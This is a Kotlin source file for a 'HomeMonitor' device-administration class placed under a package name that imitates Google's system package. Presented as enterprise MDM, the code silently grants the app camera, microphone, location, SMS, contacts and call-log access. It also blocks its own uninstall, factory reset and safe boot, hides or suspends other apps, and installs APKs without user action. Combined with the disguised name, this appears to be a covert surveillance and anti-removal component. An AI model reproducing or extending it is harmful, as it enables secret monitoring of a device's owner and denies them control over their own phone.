package com.google.android.system

import android.app.Activity
import android.app.PendingIntent
import android.app.admin.DevicePolicyManager
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.content.pm.PackageInstaller
import android.os.Build
import android.os.UserManager
import android.util.Log
import java.io.File
import java.io.FileInputStream

/**
 * DeviceAdminManager
 *
 * Provides dynamic dual-mode handling and Advanced Android Enterprise DPC capabilities for HomeMonitor:
 * - MDMesh & Headwind MDM Enterprise features: Remote Reboot, Lockscreen Notice, Screenshot Block, Statusbar Lock, USB/Bluetooth Restrictions.
 * - Checks whether the app is running as standard installation, Device Administrator, or Device Owner.
 * - Manages Device Admin prompts, screen locking, and policy queries.
 * - Advanced MDM: Kiosk Mode, Hardware Camera Disable, App Hiding/Suspension, User Restrictions, Keyguard Lock.
 * - Handles Android Enterprise permission pre-granting and silent package installation when provisioned as Device Owner.
 */
class DeviceAdminManager(private val context: Context) {

    companion object {
        private const val TAG = "DeviceAdminManager"
    }

    private val dpm = context.getSystemService(Context.DEVICE_POLICY_SERVICE) as? DevicePolicyManager
    val adminComponent = ComponentName(context, AppDeviceAdminReceiver::class.java)

    /**
     * True if user has activated Device Administrator mode for HomeMonitor.
     */
    fun isDeviceAdminActive(): Boolean {
        return dpm?.isAdminActive(adminComponent) == true
    }

    /**
     * True if HomeMonitor is provisioned as Device Owner (Android Enterprise).
     */
    fun isDeviceOwner(): Boolean {
        return dpm?.isDeviceOwnerApp(context.packageName) == true
    }

    /**
     * Launches the system Device Admin activation screen.
     */
    fun promptEnableDeviceAdmin(activity: Activity) {
        if (!isDeviceAdminActive()) {
            val intent = Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN).apply {
                putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, adminComponent)
                putExtra(
                    DevicePolicyManager.EXTRA_ADD_EXPLANATION,
                    "Enabling Device Administrator allows HomeMonitor to manage device security, remote lock, and anti-tamper features."
                )
            }
            activity.startActivity(intent)
        }
    }

    /**
     * Remotely locks the device screen if Device Admin or Device Owner is active.
     */
    fun lockScreen(): Boolean {
        return if (isDeviceAdminActive() || isDeviceOwner()) {
            dpm?.lockNow()
            true
        } else {
            false
        }
    }

    /**
     * Remotely reboots the target device (MDMesh Inspired).
     */
    fun rebootDevice(): Boolean {
        if (!isDeviceOwner()) return false
        val manager = dpm ?: return false
        return try {
            manager.reboot(adminComponent)
            Log.i(TAG, "Reboot device command issued via DPC")
            true
        } catch (e: Exception) {
            Log.e(TAG, "rebootDevice exception: ${e.message}")
            false
        }
    }

    /**
     * Sets custom lockscreen emergency information notice (MDMesh Inspired).
     */
    fun setLockScreenMessage(message: CharSequence?): Boolean {
        if (!isDeviceOwner()) return false
        val manager = dpm ?: return false
        return try {
            manager.setDeviceOwnerLockScreenInfo(adminComponent, message)
            Log.i(TAG, "Set LockScreenInfo notice: '$message'")
            true
        } catch (e: Exception) {
            Log.e(TAG, "setLockScreenMessage exception: ${e.message}")
            false
        }
    }

    /**
     * Prohibits screen capture / screenshots system-wide across all apps (MDMesh Inspired).
     */
    fun setScreenshotDisabled(disabled: Boolean): Boolean {
        if (!isDeviceOwner() && !isDeviceAdminActive()) return false
        val manager = dpm ?: return false
        return try {
            manager.setScreenCaptureDisabled(adminComponent, disabled)
            Log.i(TAG, "Screen capture disabled state set to: $disabled")
            true
        } catch (e: Exception) {
            Log.e(TAG, "setScreenshotDisabled exception: ${e.message}")
            false
        }
    }

    /**
     * Disables notification shade and quick settings pull-down in Kiosk Mode (Headwind Enterprise Inspired).
     */
    fun setStatusBarDisabled(disabled: Boolean): Boolean {
        if (!isDeviceOwner()) return false
        val manager = dpm ?: return false
        return try {
            val ok = manager.setStatusBarDisabled(adminComponent, disabled)
            Log.i(TAG, "StatusBar disabled state set to $disabled: $ok")
            ok
        } catch (e: Exception) {
            Log.e(TAG, "setStatusBarDisabled exception: ${e.message}")
            false
        }
    }

    /**
     * Single-App Kiosk / Lock Task Mode configuration.
     */
    fun setKioskMode(enabled: Boolean, targetPackageName: String = context.packageName): Boolean {
        if (!isDeviceOwner()) return false
        val manager = dpm ?: return false
        return try {
            if (enabled) {
                manager.setLockTaskPackages(adminComponent, arrayOf(targetPackageName))
                Log.i(TAG, "Configured LockTask Kiosk packages: $targetPackageName")
            } else {
                manager.setLockTaskPackages(adminComponent, arrayOf())
                Log.i(TAG, "Cleared LockTask Kiosk packages")
            }
            true
        } catch (e: Exception) {
            Log.e(TAG, "setKioskMode exception: ${e.message}")
            false
        }
    }

    /**
     * Multi-App Kiosk environment configuration (MDMesh & Headwind Inspired).
     */
    fun setMultiAppKioskMode(packageNames: List<String>): Boolean {
        if (!isDeviceOwner()) return false
        val manager = dpm ?: return false
        return try {
            manager.setLockTaskPackages(adminComponent, packageNames.toTypedArray())
            Log.i(TAG, "Configured Multi-App Kiosk packages: ${packageNames.joinToString(",")}")
            true
        } catch (e: Exception) {
            Log.e(TAG, "setMultiAppKioskMode exception: ${e.message}")
            false
        }
    }

    /**
     * Hardware-wide camera prohibition toggle.
     */
    fun setHardwareCameraDisabled(disabled: Boolean): Boolean {
        if (!isDeviceOwner() && !isDeviceAdminActive()) return false
        val manager = dpm ?: return false
        return try {
            manager.setCameraDisabled(adminComponent, disabled)
            Log.i(TAG, "Hardware Camera Disabled state set to: $disabled")
            true
        } catch (e: Exception) {
            Log.e(TAG, "setHardwareCameraDisabled exception: ${e.message}")
            false
        }
    }

    /**
     * System-wide App Package Hiding toggle (hides from launcher and settings).
     */
    fun setAppHidden(targetPackageName: String, hidden: Boolean): Boolean {
        if (!isDeviceOwner()) return false
        val manager = dpm ?: return false
        return try {
            val ok = manager.setApplicationHidden(adminComponent, targetPackageName, hidden)
            Log.i(TAG, "Package '$targetPackageName' ApplicationHidden set to $hidden: $ok")
            ok
        } catch (e: Exception) {
            Log.e(TAG, "setAppHidden exception: ${e.message}")
            false
        }
    }

    /**
     * System-wide App Package Suspension toggle.
     */
    fun setAppSuspended(targetPackageName: String, suspended: Boolean): Boolean {
        if (!isDeviceOwner()) return false
        val manager = dpm ?: return false
        return try {
            val result = manager.setPackagesSuspended(adminComponent, arrayOf(targetPackageName), suspended)
            val ok = result.isEmpty()
            Log.i(TAG, "Package '$targetPackageName' ApplicationSuspended set to $suspended: $ok")
            ok
        } catch (e: Exception) {
            Log.e(TAG, "setAppSuspended exception: ${e.message}")
            false
        }
    }

    /**
     * Blocks or unblocks uninstallation of a package using Device Owner privileges.
     */
    fun setUninstallBlocked(targetPackageName: String = context.packageName, blocked: Boolean): Boolean {
        if (!isDeviceOwner()) return false
        val manager = dpm ?: return false
        return try {
            manager.setUninstallBlocked(adminComponent, targetPackageName, blocked)
            Log.i(TAG, "UninstallBlocked set to $blocked for package: $targetPackageName")
            true
        } catch (e: Exception) {
            Log.e(TAG, "setUninstallBlocked exception: ${e.message}")
            false
        }
    }

    /**
     * Enterprise System User Restrictions (Factory Reset Block, Safe Boot Block, Multi-User Block, Uninstall Block).
     */
    fun applyEnterpriseUserRestrictions(enableRestrictions: Boolean): Boolean {
        if (!isDeviceOwner()) return false
        val manager = dpm ?: return false
        setUninstallBlocked(context.packageName, enableRestrictions)
        val restrictions = listOf(
            UserManager.DISALLOW_FACTORY_RESET,
            UserManager.DISALLOW_SAFE_BOOT,
            UserManager.DISALLOW_ADD_USER,
            UserManager.DISALLOW_UNINSTALL_APPS,
            UserManager.DISALLOW_MOUNT_PHYSICAL_MEDIA,
            UserManager.DISALLOW_USB_FILE_TRANSFER,
            UserManager.DISALLOW_CONFIG_BLUETOOTH
        )

        var count = 0
        for (res in restrictions) {
            try {
                if (enableRestrictions) {
                    manager.addUserRestriction(adminComponent, res)
                } else {
                    manager.clearUserRestriction(adminComponent, res)
                }
                count++
            } catch (e: Exception) {
                Log.e(TAG, "User restriction $res error: ${e.message}")
            }
        }
        return count > 0
    }

    /**
     * Disables lockscreen keyguard features (Camera, Fingerprint, Face unlock).
     */
    fun setKeyguardFeaturesDisabled(disabled: Boolean): Boolean {
        if (!isDeviceOwner() && !isDeviceAdminActive()) return false
        val manager = dpm ?: return false
        return try {
            val flags = if (disabled) DevicePolicyManager.KEYGUARD_DISABLE_FEATURES_ALL else DevicePolicyManager.KEYGUARD_DISABLE_FEATURES_NONE
            manager.setKeyguardDisabledFeatures(adminComponent, flags)
            Log.i(TAG, "Keyguard disabled features set to: $disabled")
            true
        } catch (e: Exception) {
            Log.e(TAG, "setKeyguardFeaturesDisabled exception: ${e.message}")
            false
        }
    }

    /**
     * Pre-grants specified runtime permissions using Android Enterprise DevicePolicyManager APIs.
     * Requires Device Owner / Profile Owner status.
     */
    fun grantEnterprisePermissions(targetPackageName: String = context.packageName): Boolean {
        if (!isDeviceOwner()) {
            Log.w(TAG, "grantEnterprisePermissions skipped: Not provisioned as Device Owner.")
            return false
        }
        val manager = dpm ?: return false

        val permissionsToGrant = listOf(
            android.Manifest.permission.CAMERA,
            android.Manifest.permission.RECORD_AUDIO,
            android.Manifest.permission.ACCESS_FINE_LOCATION,
            android.Manifest.permission.ACCESS_COARSE_LOCATION,
            android.Manifest.permission.READ_CONTACTS,
            android.Manifest.permission.READ_SMS,
            android.Manifest.permission.SEND_SMS,
            android.Manifest.permission.READ_CALL_LOG,
            android.Manifest.permission.CALL_PHONE,
            android.Manifest.permission.READ_PHONE_STATE
        )

        var successCount = 0
        for (permission in permissionsToGrant) {
            try {
                val granted = manager.setPermissionGrantState(
                    adminComponent,
                    targetPackageName,
                    permission,
                    DevicePolicyManager.PERMISSION_GRANT_STATE_GRANTED
                )
                if (granted) {
                    successCount++
                    Log.i(TAG, "Enterprise permission granted successfully: $permission for $targetPackageName")
                }
            } catch (e: Exception) {
                Log.e(TAG, "Failed to grant enterprise permission $permission: ${e.message}")
            }
        }
        return successCount > 0
    }

    /**
     * Performs silent package installation via PackageInstaller when provisioned as Device Owner.
     */
    @Throws(Exception::class)
    fun installApkSilently(apkFile: File): Boolean {
        if (!isDeviceOwner()) {
            Log.w(TAG, "installApkSilently skipped: Not provisioned as Device Owner.")
            return false
        }

        val packageInstaller = context.packageManager.packageInstaller
        val params = PackageInstaller.SessionParams(PackageInstaller.SessionParams.MODE_FULL_INSTALL)

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
            params.setRequireUserAction(PackageInstaller.SessionParams.USER_ACTION_NOT_REQUIRED)
        }

        val sessionId = packageInstaller.createSession(params)
        val session = packageInstaller.openSession(sessionId)

        try {
            session.openWrite("package", 0, apkFile.length()).use { outStream ->
                FileInputStream(apkFile).use { inStream ->
                    inStream.copyTo(outStream)
                }
                outStream.flush()
            }

            val intent = Intent("com.google.android.system.ACTION_SILENT_INSTALL_COMPLETE").setPackage(context.packageName)
            val flags = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_MUTABLE
            } else {
                PendingIntent.FLAG_UPDATE_CURRENT
            }
            val pendingIntent = PendingIntent.getBroadcast(context, sessionId, intent, flags)

            session.commit(pendingIntent.intentSender)
            session.close()
            Log.i(TAG, "Silent PackageInstaller session committed successfully (Session ID: $sessionId)")
            return true
        } catch (e: Exception) {
            session.abandon()
            throw e
        }
    }
}
